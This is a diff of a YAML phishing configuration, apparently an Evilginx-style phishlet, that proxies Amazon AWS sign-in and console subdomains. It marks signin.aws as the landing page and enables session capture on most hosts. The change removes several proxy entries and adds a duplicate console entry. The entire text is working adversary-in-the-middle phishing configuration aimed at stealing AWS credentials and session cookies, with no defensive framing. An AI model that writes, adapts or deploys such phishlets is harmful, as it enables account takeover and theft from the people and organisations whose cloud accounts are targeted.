@@ -3,14 +3,10 @@ min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'aws', orig_sub: 'aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'console', orig_sub: 'console', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: '', orig_sub: '', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'signin.aws', orig_sub: 'signin.aws', domain: 'amazon.com', session: true, is_landing: true, auto_filter: true}
-  - {phish_sub: 'aws-portal', orig_sub: 'aws-portal', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: 'us-east-2.console.aws', orig_sub: 'us-east-2.console.aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'console', orig_sub: 'console', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'portal.aws', orig_sub: 'portal.aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: 's3.console.aws', orig_sub: 's3.console.aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: 'signin.aws', orig_sub: 'signin.aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
-
+      
 ## SUBDOMAINS BASED ON GEO LOCATION.
   - {phish_sub: 'us-east-1.console.aws', orig_sub: 'us-east-1.console.aws', domain: 'amazon.com', session: false, is_landing: false, auto_filter: true}
   - {phish_sub: 'us-east-2.console.aws', orig_sub: 'us-east-2.console.aws', domain: 'amazon.com', session: false, is_landing: false, auto_filter: true}  
